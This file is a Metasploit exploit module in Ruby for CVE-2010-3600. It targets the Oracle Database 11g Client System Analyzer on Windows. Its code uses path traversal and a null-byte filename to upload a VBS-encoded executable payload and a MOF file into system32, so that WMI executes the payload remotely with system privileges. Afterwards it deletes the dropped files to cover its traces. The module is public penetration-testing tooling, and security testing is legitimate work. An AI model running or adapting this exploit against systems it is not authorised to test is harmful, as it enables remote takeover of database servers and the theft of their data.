##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Oracle Containers for J2EE/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Database Client System Analyzer Arbitrary File Upload',
      'Description'    => %q{
          This module exploits an arbitrary file upload vulnerability on the Client
        Analyzer component as included in Oracle Database 11g, which allows remote
        attackers to upload and execute arbitrary code. This module has been tested
        successfully on Oracle Database 11g 11.2.0.1.0 on Windows 2003 SP2, where execution
        through the Windows Management Instrumentation service has been used.
      },
      'Author'         =>
        [
          '1c239c43f521145fa8385d64a9c32243', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => [ 'win' ],
      'Privileged'     => true,
      'References'     =>
        [
          [ 'CVE', '2010-3600' ],
          [ 'OSVDB', '70546'],
          [ 'BID', '45883'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-018/' ],
          [ 'URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2011-194091.html' ]
        ],
      'Targets'        =>
        [
          [ 'Oracle Oracle11g 11.2.0.1.0 / Windows 2003 SP2', {} ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 18 2011'
    ))

    register_options(
      [
        Opt::RPORT(1158),
        OptBool.new('SSL', [true, 'Use SSL', true]),
        OptInt.new('DEPTH', [true, 'Traversal depth to reach the root', 13])
      ], self.class )
  end

  def on_new_session(client)

    return if not @var_mof_name
    return if not @var_vbs_name

    vbs_path = "C:\\windows\\system32\\#{@var_vbs_name}.vbs"
    mof_path = "C:\\windows\\system32\\wbem\\mof\\good\\#{@var_mof_name}.mof"

    if client.type != "meterpreter"
      print_error("NOTE: you must use a meterpreter payload in order to automatically cleanup.")
      print_error("The vbs payload (#{vbs_path}) and mof file (#{mof_path}) must be removed manually.")
      return
    end

    # stdapi must be loaded before we can use fs.file
    client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")

    attrib_path = "C:\\windows\\system32\\attrib.exe -r "

    cmd = attrib_path + mof_path

    client.sys.process.execute(cmd, nil, {'Hidden' => true })

    begin
      print_warning("Deleting the vbs payload \"#{@var_vbs_name}.vbs\" ...")
      client.fs.file.rm(vbs_path)
      print_warning("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
      client.fs.file.rm(mof_path)
    rescue ::Exception => e
      print_error("Exception: #{e.inspect}")
    end

  end

  def upload_file(data)
    res = send_request_cgi(
      {
        'uri'     => '/em/ecm/csa/v10103/CSAr.jsp',
        'method'  => 'POST',
        'data'    => data
      })

    return res
  end

  def check

    file_name = rand_text_alpha(rand(5)+5)
    file_contents = rand_text_alpha(rand(20)+20)

    data = "sessionID=#{file_name}.txt\x00.xml"
    data << "\x0d\x0a"
    data << Rex::Text.uri_encode(file_contents)

    print_status("Uploading the CSA#{file_name}.txt file")
    res = upload_file(data)
    if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)
      print_error("The test file could not be uploaded")
      return Exploit::CheckCode::Safe
    end

    print_status("Checking uploaded contents...")
    res = send_request_raw({'uri' => "/em/CSA#{file_name}.txt"})

    if res and res.code == 200 and res.body =~ /#{file_contents}/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Appears

  end

  def exploit

    # In order to save binary data to the file system the payload is written to a .vbs
    # file and execute it from there.
    @var_mof_name = rand_text_alpha(rand(5)+5)
    @var_vbs_name = rand_text_alpha(rand(5)+5)

    print_status("Encoding payload into vbs...")
    # Only 100KB can be uploaded by default, because of this "to_win32pe_old" is used,
    # the "new" template is too big in this case.
    exe = Msf::Util::EXE.to_win32pe_old(framework, payload.encoded)
    # The payload is embedded in a vbs and executed from there to avoid badchars that
    # URLDecoder.decode (jsp) is unable to decode correctly such as 0x81, 0x8d, 0x8f,
    # 0x90 and 0x9d
    vbs = Msf::Util::EXE.to_exe_vbs(exe)

    print_status("Generating mof file...")
    mof_content = generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs")

    traversal = "..\\" * datastore['DEPTH']
    data = "sessionID=#{traversal}\\WINDOWS\\system32\\#{@var_vbs_name}.vbs\x00.xml"
    data << "\x0d\x0a"
    # The data to upload must be uri encoded because the vulnerable jsp will use
    # URLDecoder.decode on it before writting to file.
    data << Rex::Text.uri_encode(vbs)
    print_status("Uploading the payload into the VBS to c:\\WINDOWS\\system32\\#{@var_vbs_name}.vbs...")
    res = upload_file(data)
    if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)
      fail_with(Exploit::Failure::Unknown, 'VBS upload failed')
    end

    data = "sessionID=#{traversal}WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof\x00.xml"
    data << "\x0d\x0a"
    data << Rex::Text.uri_encode(mof_content)
    print_status("Uploading the mof file to c:\\WINDOWS\\system32\\wbem\\mof\\#{@var_mof_name}.mof...")
    res = upload_file(data)
    if not res or res.code != 200 or (res.body !~ /posted data was written to placeholder file/ and res.body !~ /csaPostStatus=0/)
      fail_with(Exploit::Failure::Unknown, 'MOF upload failed')
    end

  end
end
